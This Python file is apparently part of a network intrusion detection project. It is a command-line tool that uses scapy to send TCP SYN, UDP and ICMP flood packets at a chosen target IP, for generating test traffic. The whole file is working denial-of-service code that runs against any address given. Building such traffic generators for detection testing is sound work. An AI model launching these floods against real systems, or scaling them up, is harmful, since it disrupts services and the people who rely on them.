# attacks/dos_attacker.py

import argparse
import random
import sys
import time
from scapy.all import IP, TCP, UDP, ICMP, Raw, send


def _send_attack_packets(attack_name: str, target_desc: str, packet_factory, packet_count: int, delay: float):
    """Generic worker loop for transmitting attack packets to eliminate code redundancy."""
    print(f"\n[+] Launching {attack_name} on {target_desc}")
    print(f"[+] Total Packets: {packet_count} | Delay: {delay}s\n")

    sent_count = 0
    for _ in range(packet_count):
        pkt = packet_factory()
        send(pkt, verbose=0)

        sent_count += 1
        if sent_count % 50 == 0 or sent_count == packet_count:
            print(f"  [{attack_name.upper()}] Sent {sent_count}/{packet_count} packets...")

        if delay > 0:
            time.sleep(delay)

    print(f"\n[✔] {attack_name} completed. Total sent: {sent_count} packets.")


def run_syn_flood(target_ip: str, target_port: int, packet_count: int, delay: float):
    """Fires a high-volume TCP SYN flood attack with randomized source ports."""
    factory = lambda: IP(dst=target_ip) / TCP(
        sport=random.randint(1024, 65535),
        dport=target_port,
        flags="S",
        seq=random.randint(1000, 9000),
    )
    _send_attack_packets("TCP SYN Flood", f"{target_ip}:{target_port}", factory, packet_count, delay)


def run_udp_flood(target_ip: str, target_port: int, packet_count: int, delay: float):
    """Fires a UDP flood with randomized payload data and source ports."""
    payload = Raw(b"X" * 1024)  # 1 KB dummy payload
    factory = lambda: IP(dst=target_ip) / UDP(
        sport=random.randint(1024, 65535),
        dport=target_port,
    ) / payload
    _send_attack_packets("UDP Flood", f"{target_ip}:{target_port}", factory, packet_count, delay)


def run_icmp_flood(target_ip: str, packet_count: int, delay: float):
    """Fires an ICMP Ping flood."""
    factory = lambda: IP(dst=target_ip) / ICMP()
    _send_attack_packets("ICMP Ping Flood", target_ip, factory, packet_count, delay)


def main():
    parser = argparse.ArgumentParser(description="DoS Attack Simulation Tool for NIDS Testing")
    parser.add_argument("--target", required=True, help="Target IP address (VPN IP of victim machine)")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--type", choices=["syn", "udp", "icmp"], default="syn", help="Attack type: syn, udp, or icmp")
    parser.add_argument("--count", type=int, default=300, help="Number of packets to send (default: 300)")
    parser.add_argument("--delay", type=float, default=0.01, help="Delay between packets in seconds (default: 0.01)")

    args = parser.parse_args()

    print("=" * 60)
    print("      XAI-NIDS Module 5: DoS Attack Simulator")
    print("=" * 60)

    try:
        if args.type == "syn":
            run_syn_flood(args.target, args.port, args.count, args.delay)
        elif args.type == "udp":
            run_udp_flood(args.target, args.port, args.count, args.delay)
        elif args.type == "icmp":
            run_icmp_flood(args.target, args.count, args.delay)
    except KeyboardInterrupt:
        print("\n[!] Attack aborted by user.")
    except PermissionError:
        print("\n[✘] ERROR: Administrator / Root privileges required to send raw packets.")
        print("    Please re-run this command in an Administrator PowerShell / Terminal.")
        sys.exit(1)


if __name__ == "__main__":
    main()